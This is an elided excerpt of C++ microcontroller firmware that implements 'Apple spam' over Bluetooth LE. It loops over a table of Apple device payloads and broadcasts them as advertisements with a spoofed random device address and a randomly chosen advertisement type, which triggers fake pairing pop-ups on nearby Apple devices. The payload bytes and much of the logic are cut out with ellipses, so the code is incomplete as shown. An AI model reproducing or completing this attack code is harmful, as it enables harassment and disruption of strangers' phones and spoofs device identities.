...
static const uint8_t data_airpods[] = {
...
void quickAppleSpam(int payloadIndex) {
    ...
    advertisementData.addData(apple_payloads[payloadIndex].data, apple_payloads[payloadIndex].length);
#else
    std::vector<uint8_t> payloadVector(apple_payloads[payloadIndex].data, 
                                        apple_payloads[payloadIndex].data + apple_payloads[payloadIndex].length);
...
#ifdef NIMBLE_V2_PLUS
        advertisementData.addData(apple_payloads[apple_index].data, apple_payloads[apple_index].length);
#else
        std::vector<uint8_t> payloadVector(apple_payloads[apple_index].data, 
                                            apple_payloads[apple_index].data + apple_payloads[apple_index].length);
        advertisementData.addData(payloadVector);
#endif
...
void startAppleSpam(int payloadIndex) {
    ...
    while (apple_spam_running) {
        ...
        BLEServer* pServer = BLEDevice::createServer();
        pAppleAdvertising = pServer->getAdvertising();
        ...
        pAppleAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
        
        int adv_type = random(3);
        if (adv_type == 0) {
            pAppleAdvertising->setAdvertisementType(ADV_TYPE_IND);
        } else if (adv_type == 1) {
            pAppleAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
        } else {
            pAppleAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
        }
